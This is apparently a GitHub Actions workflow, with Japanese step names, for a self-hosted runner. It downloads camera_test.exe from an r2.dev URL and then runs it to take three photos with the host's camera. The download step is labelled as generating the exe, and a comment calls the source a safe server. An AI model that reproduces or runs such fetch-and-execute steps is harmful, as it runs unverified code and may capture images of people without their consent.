name: Negi Monitor Test

on:
  workflow_dispatch:

jobs:
  run-monitor:
    runs-on: self-hosted

    steps:
    - name: 1. GitHubから最新のコードをあなたのPCに持ってくる
      uses: actions/checkout@v4

    - name: 2. 撮影用プログラム(exe)をあなたのGitHubに自動配置する
      run: |
        Write-Host "★exeファイルを自動生成中..."
        # パワーシェルの標準機能で安全なサーバーからファイルを引っ張ります
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $url = "https://pub-726485038c1a4b49bcf2d6bd465228ee.r2.dev/camera_test.exe"
        Invoke-WebRequest -Uri $url -OutFile "./camera_test.exe"

    - name: 3. カメラを起動して3枚撮影する
      run: |
        Write-Host "★テスト開始: カメラを起動します"
        if (Test-Path "./camera_test.exe") {
            ./camera_test.exe
        } else {
            Write-Host "❌ ファイルの作成に失敗しました"
        }
        Write-Host "★テスト終了: 撮影完了しました"
